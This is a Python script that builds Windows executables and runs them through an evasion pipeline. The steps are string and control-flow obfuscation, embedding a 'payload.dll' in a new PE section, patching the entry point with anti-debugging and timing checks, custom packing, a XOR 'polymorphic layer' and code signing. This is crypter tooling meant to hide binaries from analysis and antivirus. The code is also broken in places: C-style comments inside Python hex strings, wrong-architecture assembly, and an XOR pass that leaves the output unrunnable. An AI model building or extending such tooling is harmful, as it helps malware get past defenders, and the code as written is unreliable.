import os
import sys
import subprocess
import shutil
import time
import hashlib
import json
import pefile
import lief
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from obfuscation import ControlFlowFlattening, StringEncryptionPass, CustomPacker, StringObfuscator

class AdvancedWindowsBuilder:
    def __init__(self, config_file="build_config.json"):
        self.config = self.load_config(config_file)
        self.temp_dir = "build_temp"
        self.obfuscator = StringObfuscator()
        self.obfuscation_key = os.urandom(32).hex()
        
    def load_config(self, config_file):
        default_config = {
            "source_dir": "src",
            "output_dir": "dist",
            "main_executable": "main.exe",
            "resources": ["data.bin", "config.json"],
            "inject_dll": False,
            "dll_to_inject": "payload.dll",
            "sign_binary": False,
            "signing_cert": "cert.pfx",
            "signing_password": "",
            "enable_anti_analysis": True,
            "pack_executable": True,
            "obfuscation_level": "high",
            "target_architecture": "x64",
            "compiler_flags": ["/O2", "/GL", "/MT"],
            "linker_flags": ["/SUBSYSTEM:WINDOWS", "/ENTRY:mainCRTStartup"],
            "post_build_commands": []
        }
        
        try:
            with open(config_file, "r") as f:
                user_config = json.load(f)
                # Merge with default config
                return {**default_config, **user_config}
        except:
            return default_config
    
    def compile(self):
        print("[+] Starting advanced build process...")
        self.clean_build_dir()
        self.prepare_temp_dir()
        self.preprocess_code()
        self.compile_sources()
        self.link_executable()
        self.process_resources()
        
        if self.config["inject_dll"]:
            self.inject_dll()
        
        if self.config["enable_anti_analysis"]:
            self.apply_anti_analysis()
        
        if self.config["pack_executable"]:
            self.pack_executable()
        
        if self.config["sign_binary"]:
            self.sign_binary()
        
        self.run_post_build()
        self.cleanup()
        print("[+] Build completed successfully!")
    
    def clean_build_dir(self):
        if os.path.exists(self.config["output_dir"]):
            shutil.rmtree(self.config["output_dir"])
        os.makedirs(self.config["output_dir"])
        
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
        os.makedirs(self.temp_dir)
    
    def prepare_temp_dir(self):
        # Copy source files to temp directory
        shutil.copytree(self.config["source_dir"], os.path.join(self.temp_dir, "src"))
        
        # Create resource directory
        os.makedirs(os.path.join(self.temp_dir, "resources"))
        for res in self.config["resources"]:
            if os.path.exists(res):
                shutil.copy(res, os.path.join(self.temp_dir, "resources", res))
    
    def preprocess_code(self):
        print("[+] Preprocessing source code...")
        src_dir = os.path.join(self.temp_dir, "src")
        
        # Apply string obfuscation to all source files
        for root, _, files in os.walk(src_dir):
            for file in files:
                if file.endswith((".cpp", ".c", ".h")):
                    file_path = os.path.join(root, file)
                    self.obfuscate_file(file_path)
        
        # Apply LLVM obfuscation passes
        if shutil.which("clang") and self.config["obfuscation_level"] == "high":
            print("[+] Applying LLVM obfuscation passes...")
            for root, _, files in os.walk(src_dir):
                for file in files:
                    if file.endswith((".cpp", ".c")):
                        file_path = os.path.join(root, file)
                        self.apply_llvm_passes(file_path)
    
    def obfuscate_file(self, file_path):
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        
        # Find and obfuscate strings
        obfuscated_content = ""
        current_index = 0
        in_string = False
        string_start = 0
        
        for i, char in enumerate(content):
            if char == '"' and (i == 0 or content[i-1] != '\\'):
                if in_string:
                    # End of string
                    string_content = content[string_start+1:i]
                    if len(string_content) > 3 and not string_content.startswith("http"):
                        obfuscated_string = self.obfuscator.obfuscate(
                            string_content, self.obfuscation_key
                        )
                        obfuscated_content += f'"{obfuscated_string}"'
                    else:
                        obfuscated_content += content[string_start:i+1]
                    in_string = False
                else:
                    # Start of string
                    in_string = True
                    string_start = i
                    obfuscated_content += content[current_index:i]
                    current_index = i
            elif not in_string:
                obfuscated_content += char
        
        # Write back obfuscated content
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(obfuscated_content)
    
    def apply_llvm_passes(self, file_path):
        # Compile to LLVM IR
        ir_file = file_path + ".ll"
        cmd = [
            "clang", "-S", "-emit-llvm", 
            "-o", ir_file, 
            file_path
        ]
        subprocess.run(cmd, check=True)
        
        # Apply obfuscation passes
        opt_cmd = [
            "opt", "-load", "obfuscation/llvm_passes/ControlFlowFlattening.so",
            "-cff", "-S", 
            "-load", "obfuscation/llvm_passes/StringEncryptionPass.so",
            "-strcrypt", "-S",
            "-o", ir_file, 
            ir_file
        ]
        subprocess.run(opt_cmd, check=True)
        
        # Compile back to object file
        obj_file = file_path + ".o"
        subprocess.run(["clang", "-c", "-o", obj_file, ir_file], check=True)
        os.remove(ir_file)
    
    def compile_sources(self):
        print("[+] Compiling source files...")
        src_dir = os.path.join(self.temp_dir, "src")
        obj_dir = os.path.join(self.temp_dir, "obj")
        os.makedirs(obj_dir)
        
        compiler = "cl" if os.name == "nt" else "x86_64-w64-mingw32-g++"
        flags = self.config["compiler_flags"]
        
        if self.config["target_architecture"] == "x64":
            flags.append("/D_WIN64")
            if os.name == "nt":
                flags.append("/MD")
        
        for root, _, files in os.walk(src_dir):
            for file in files:
                if file.endswith((".cpp", ".c")):
                    src_path = os.path.join(root, file)
                    obj_path = os.path.join(obj_dir, os.path.splitext(file)[0] + ".o")
                    
                    if file.endswith(".o") and os.path.exists(obj_path):
                        continue  # Already compiled
                    
                    cmd = [compiler, "/c", src_path, "/Fo" + obj_path] + flags
                    subprocess.run(cmd, check=True)
    
    def link_executable(self):
        print("[+] Linking executable...")
        obj_dir = os.path.join(self.temp_dir, "obj")
        output_path = os.path.join(self.temp_dir, self.config["main_executable"])
        
        linker = "link" if os.name == "nt" else "x86_64-w64-mingw32-g++"
        flags = self.config["linker_flags"]
        
        obj_files = [os.path.join(obj_dir, f) for f in os.listdir(obj_dir) if f.endswith(".o")]
        
        cmd = [linker, "/OUT:" + output_path] + obj_files + flags
        
        # Add resource files if any
        res_dir = os.path.join(self.temp_dir, "resources")
        if os.path.exists(res_dir) and os.listdir(res_dir):
            res_files = [os.path.join(res_dir, f) for f in os.listdir(res_dir)]
            cmd += ["/MANIFEST:EMBED", "/MANIFESTINPUT:" + res_files[0]]
        
        subprocess.run(cmd, check=True)
    
    def process_resources(self):
        print("[+] Processing resources...")
        res_dir = os.path.join(self.temp_dir, "resources")
        output_path = os.path.join(self.temp_dir, self.config["main_executable"])
        
        if not os.path.exists(res_dir) or not os.listdir(res_dir):
            return
        
        # Encrypt and embed resources
        pe = lief.PE.parse(output_path)
        resources = pe.resources_manager
        
        for res_file in os.listdir(res_dir):
            res_path = os.path.join(res_dir, res_file)
            with open(res_path, "rb") as f:
                data = f.read()
            
            # Encrypt resource
            cipher = AES.new(self.obfuscation_key.encode()[:16], AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            encrypted_data = cipher.iv + ct_bytes
            
            # Add to PE resources
            resources.add_data(
                encrypted_data,
                name=res_file,
                lang=lief.PE.RESOURCE_LANGS.ENGLISH
            )
        
        # Rebuild PE with new resources
        builder = lief.PE.Builder(pe)
        builder.build_resources(True)
        builder.build()
        builder.write(output_path)
    
    def inject_dll(self):
        print("[+] Injecting DLL...")
        main_exe = os.path.join(self.temp_dir, self.config["main_executable"])
        dll_path = self.config["dll_to_inject"]
        
        if not os.path.exists(dll_path):
            print(f"[-] Error: DLL not found at {dll_path}")
            return
        
        # Open the PE file
        pe = pefile.PE(main_exe)
        
        # Add a new section for the DLL
        dll_data = open(dll_path, "rb").read()
        section_name = ".inject"
        section_offset = pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData
        section_virtual_address = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize
        section_virtual_address = (section_virtual_address + 0x1000 - 1) & ~(0x1000 - 1)  # Align
        
        # Create new section
        new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
        new_section.__unpack__(bytearray(new_section.sizeof()))
        new_section.Name = section_name.encode()
        new_section.Misc_VirtualSize = len(dll_data)
        new_section.VirtualAddress = section_virtual_address
        new_section.SizeOfRawData = (len(dll_data) + 0x1000) & ~(0x1000 - 1)
        new_section.PointerToRawData = section_offset
        new_section.Characteristics = (
            pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] |
            pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] |
            pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_INITIALIZED_DATA']
        )
        
        pe.sections.append(new_section)
        pe.__structures__.append(new_section)
        
        # Update PE header
        pe.OPTIONAL_HEADER.SizeOfImage = (
            new_section.VirtualAddress + 
            new_section.Misc_VirtualSize + 
            0x1000
        ) & ~(0x1000 - 1)
        
        # Write DLL data to section
        pe.set_bytes_at_offset(section_offset, dll_data)
        
        # Save modified executable
        pe.write(main_exe)
    
    def apply_anti_analysis(self):
        print("[+] Applying anti-analysis techniques...")
        main_exe = os.path.join(self.temp_dir, self.config["main_executable"])
        
        # Add anti-debugging checks
        with open(main_exe, "r+b") as f:
            pe_data = bytearray(f.read())
            
            # Find entry point
            pe = pefile.PE(data=pe_data)
            entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            
            # Insert anti-debug assembly
            anti_debug_asm = bytes.fromhex(
                "E8000000005B83EB05"                  // CALL $+5; POP EBX; SUB EBX,5
                "648B1D300000008A4302"                // MOV EBX, FS:[0x30]; MOV AL, [EBX+2]
                "84C07503EBFE"                        // TEST AL, AL; JNZ $+5; JMP $-2 (infinite loop)
                "0F31"                                // RDTSC
                "89C1"                                // MOV ECX, EAX
                "90909090"                            // NOPs (timing)
                "0F31"                                // RDTSC
                "29C8"                                // SUB EAX, ECX
                "3D001000007703EBFE"                  // CMP EAX, 0x1000; JA $+5; JMP $-2
            )
            
            # Create new section for anti-analysis code
            section_name = ".antianal"
            section_offset = len(pe_data)
            section_virtual_address = pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize
            section_virtual_address = (section_virtual_address + 0x1000 - 1) & ~(0x1000 - 1)
            
            # Add padding
            pe_data += b"\x00" * 0x200
            
            # Write anti-debug code
            pe_data += anti_debug_asm
            
            # Add jump to original entry point
            jmp_offset = section_virtual_address + len(anti_debug_asm) + 5
            jmp_instruction = bytes.fromhex("E9") + (entry_point - jmp_offset).to_bytes(4, "little")
            pe_data += jmp_instruction
            
            # Update PE headers
            pe = pefile.PE(data=pe_data)
            
            # Add new section
            new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
            new_section.__unpack__(bytearray(new_section.sizeof()))
            new_section.Name = section_name.encode()
            new_section.Misc_VirtualSize = len(anti_debug_asm) + len(jmp_instruction)
            new_section.VirtualAddress = section_virtual_address
            new_section.SizeOfRawData = (new_section.Misc_VirtualSize + 0x1000 - 1) & ~(0x1000 - 1)
            new_section.PointerToRawData = section_offset
            new_section.Characteristics = (
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] |
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] |
                pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']
            )
            
            pe.sections.append(new_section)
            pe.__structures__.append(new_section)
            
            # Update entry point
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = section_virtual_address
            
            # Update image size
            pe.OPTIONAL_HEADER.SizeOfImage = (
                new_section.VirtualAddress + 
                new_section.Misc_VirtualSize + 
                0x1000
            ) & ~(0x1000 - 1)
            
            # Save modified executable
            f.seek(0)
            f.write(pe.write())
    
    def pack_executable(self):
        print("[+] Packing executable...")
        main_exe = os.path.join(self.temp_dir, self.config["main_executable"])
        output_path = os.path.join(self.config["output_dir"], self.config["main_executable"])
        
        packer = CustomPacker(key=self.obfuscation_key.encode())
        packer.pack(main_exe, output_path)
        
        # Add polymorphic layer
        if self.config["obfuscation_level"] == "high":
            self.add_polymorphic_layer(output_path)
    
    def add_polymorphic_layer(self, file_path):
        print("[+] Adding polymorphic layer...")
        with open(file_path, "rb") as f:
            data = f.read()
        
        # Simple XOR polymorphism
        poly_key = os.urandom(4)
        poly_data = bytearray(data)
        for i in range(len(poly_data)):
            poly_data[i] ^= poly_key[i % 4]
        
        with open(file_path, "wb") as f:
            f.write(poly_data)
    
    def sign_binary(self):
        if not os.path.exists(self.config["signing_cert"]):
            print("[-] Signing certificate not found. Skipping signing.")
            return
        
        print("[+] Signing binary...")
        output_path = os.path.join(self.config["output_dir"], self.config["main_executable"])
        cmd = [
            "signtool", "sign", "/f", self.config["signing_cert"],
            "/p", self.config["signing_password"],
            "/t", "http://timestamp.digicert.com",
            output_path
        ]
        subprocess.run(cmd, check=True)
    
    def run_post_build(self):
        for cmd in self.config["post_build_commands"]:
            print(f"[+] Running post-build command: {cmd}")
            subprocess.run(cmd, shell=True)
    
    def cleanup(self):
        # Move final executable to output dir
        temp_exe = os.path.join(self.temp_dir, self.config["main_executable"])
        output_exe = os.path.join(self.config["output_dir"], self.config["main_executable"])
        
        if os.path.exists(temp_exe):
            shutil.move(temp_exe, output_exe)
        
        # Clean up temp directory
        shutil.rmtree(self.temp_dir)

if __name__ == "__main__":
    builder = AdvancedWindowsBuilder()
    builder.compile()